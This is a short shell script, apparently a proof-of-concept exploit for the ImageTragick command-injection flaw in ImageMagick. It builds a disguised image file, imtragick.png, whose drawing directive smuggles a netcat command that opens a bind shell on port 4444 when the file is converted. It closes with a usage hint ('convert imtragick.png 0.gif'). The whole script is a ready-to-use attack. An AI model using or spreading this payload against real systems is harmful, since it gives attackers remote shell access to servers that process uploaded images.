#!/bin/sh
echo "Imagetragick PoC by @Wireghoul"
echo "-----[justanotherhacker.com]---"
echo " [*] Creating bind shell file imtragick.png"
echo "push graphic-context" > imtragick.png
echo "viewbox 0 0 1 1 image over 0,0 0,0 'https://test/\" || nc -e /bin/sh -lp 4444 && echo \"1'" >> imtragick.png
echo " [*] File created, converting file to another format will trigger the bug."
echo " [-] ie; convert imtragick.png 0.gif"
